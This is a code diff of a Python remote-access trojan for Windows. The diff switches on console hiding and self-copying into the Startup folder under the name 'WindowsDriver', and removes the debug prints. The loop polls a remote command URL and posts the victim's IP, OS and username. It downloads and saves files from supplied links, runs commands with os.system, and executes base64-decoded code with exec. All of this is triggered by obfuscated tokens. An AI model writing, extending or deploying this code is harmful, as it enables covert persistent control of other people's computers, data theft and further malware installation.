@@ -17,7 +17,7 @@ import platform
 import win32gui, win32con
 
 # no consol
-#ctypes.windll.kernel32.FreeConsole()
+ctypes.windll.kernel32.FreeConsole()
 
 # seting up directorys
 
@@ -43,7 +43,7 @@ startup = ("C:" + "/Users/" + str(user) + f"/{ffname}")
 startup2 = ("C:" + "/Users/" + str(user) + f"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/WindowsDriver.{ext}")
 
 try:
-    #shutil.move(my_file, startup)           # del that to stop auto run
+    shutil.move(my_file, startup)           # del that to stop auto run
     rr = os.rename(startup, startup2)
 except:
     pass
@@ -68,12 +68,10 @@ version_API = "1.1"
 result = "None"
 
 my_IP = urlopen(Request(url_ip)).read().decode().strip()
-print(f" my_IP: {my_IP}")                                       #######
 
 # main loop
 while True:
     data = urlopen(Request(url_raw)).read().decode()
-    print(f" data: {data}")                                   #######
 
     
     if result not in data:
@@ -84,20 +82,17 @@ while True:
             oss = platform.system()
 
             result = f"{data}\n    {oss}    [{ip}]   {user}      {version_client}"
-            print(f" result: {result}")                          #######
             json =   {
                 "Title": "",
                 "Content": result,
             }
             requests.post(url_edit, data=json)
-            print(" sended ip")                          #######
 
 
         if "d0wNL04D" in data:
             print("got a dwonload 1 ")
             if my_IP in data:
                 print("GOT A DOWNLOAD")
-                                          #######
 
                 res = data.split(",")  # format: "d0wNL04D", {ip}, {exe}, {link}
                 b = 0
@@ -106,11 +101,9 @@ while True:
                     print(b)
                     if b == 3:
                         ext = link
-                        print(f"extention: {ext}")                       #######
                     else:
                         pass
                     if b == 4:
-                        print(f"link: {link}")                          #######
                         mlw = requests.get(link, allow_redirects=True)
                         print(mlw)
                     else:
@@ -119,8 +112,6 @@ while True:
                 user = getpass.getuser()
 
                 f_total = (f"{path}/{ext}")
-
-                print(f_total)                     #######
 
                 try:
                     open(f_total, 'wb').write(mlw.content)
@@ -141,7 +132,6 @@ while True:
                 cmd = data.replace(my_IP, "")
                 cmd = cmd.replace("Ex3c", "")
                 lis = list(cmd.split(","))
-                print(lis)                          #######
                 for cmdd in lis:
                     os.system(cmdd)
                 json = {
@@ -152,19 +142,15 @@ while True:
 
         if "1J3cTe" in data:
             if my_IP in data:
-                print("got one")                          #######
                 data = data.replace(my_IP, "")
                 data = data.replace("1J3cTe", "")
                 lis = list(data.split(","))
-                print(lis)                          #######
 
                 for script in lis:
                     base64_bytes = script.encode('ascii')
                     message_bytes = base64.b64decode(base64_bytes)
                     ready = message_bytes.decode('ascii')
-                    print(ready)                          #######
                     exec(ready)
-                print("fished")                          #######
                 
                 json = {
                     "Title": "",
